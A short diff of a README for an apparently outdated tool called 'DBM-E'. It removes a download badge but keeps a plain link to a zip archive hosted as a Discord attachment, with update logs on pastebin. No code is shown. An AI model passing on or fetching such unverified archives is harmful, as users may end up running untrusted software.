@@ -5,10 +5,6 @@
 
 # Status: OUTDATED [UPDATE PENDING] | Update Logs: https://pastebin.com/zAiuWqzg
 
-
-## Downloading DBM-E 
-[![standard-readme compliant](https://img.shields.io/badge/Get/Download-DBME-blueviolet.svg?style=flat-square)](https://cdn.discordapp.com/attachments/1019257446046376008/1025419561111134270/DBME-Files.zip)
-
 Download Link: https://cdn.discordapp.com/attachments/1019257446046376008/1025419561111134270/DBME-Files.zip
 
 ### Installation
